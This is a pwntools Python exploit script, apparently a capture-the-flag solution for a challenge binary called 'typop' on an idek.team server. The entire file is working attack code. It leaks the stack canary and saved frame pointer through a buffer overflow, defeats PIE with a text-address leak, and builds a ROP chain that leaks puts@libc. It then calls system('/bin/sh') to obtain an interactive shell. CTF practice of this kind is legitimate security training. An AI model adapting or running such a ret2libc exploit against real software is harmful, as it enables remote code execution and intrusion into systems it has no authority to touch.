#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc-2.31.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("typop.chal.idek.team", 1337)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *getFeedback+75
		#b *getFeedback+177
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# leak canary
p.sendlineafter('?', b'y')
p.sendafter('?', b'A' * 0xb)
p.recvuntil(b'A' * 0xb)
canary = u64(b'\0' + p.recv(7))
log.info("canary: " + hex(canary))
saved_rbp = u64(p.recv(6) + b'\0' * 2)
log.info("saved rbp: " + hex(saved_rbp))
# fix broken canary
p.sendafter('?', b'B' * 0xa + b'\0')
# leak text address for ROP
p.sendlineafter('?', b'y')
p.sendafter('?', b'C' * 0x1a)
p.recvuntil(b'C' * 0x1a)
text_leak = u64(p.recv(6) + b'\0' * 2)
log.info("text leak: " + hex(text_leak))
text_base = text_leak - 0x1447
log.info("text base: " + hex(text_base))
# fix broken stack layout
payload = b'D' * 0xa
payload += p64(canary)
payload += p64(saved_rbp)
p.sendafter('?', payload)
# ROP
rop_pop_rdi = text_base + 0x14d3
rop_ret = text_base + 0x14f4

p.sendlineafter('?', b'y')
p.sendlineafter('?', b'y')
payload = b'E' * 0xa
payload += p64(canary)
payload += p64(saved_rbp)
payload += p64(rop_pop_rdi)
payload += p64(text_base + elf.got['puts'])
payload += p64(text_base + elf.plt['puts'])

payload += p64(text_base + elf.symbols['main'])
p.sendafter('?', payload)
p.recvline()
puts_libc_addr = u64(p.recv(6) + b'\0' * 2)
log.info("puts@libc: " + hex(puts_libc_addr))
libc_base = puts_libc_addr - libc.symbols['puts']
log.info("libc base: " + hex(libc_base))

p.sendlineafter('?', b'y')
p.sendlineafter('?', b'y')
payload = b'F' * 0x2
payload += b"/bin/sh\0"
payload += p64(canary)
payload += p64(saved_rbp)
payload += p64(rop_pop_rdi)
payload += p64(saved_rbp - 0x10)
payload += p64(rop_ret)
payload += p64(libc_base + libc.symbols['system'])
p.sendafter('?', payload)

p.interactive()
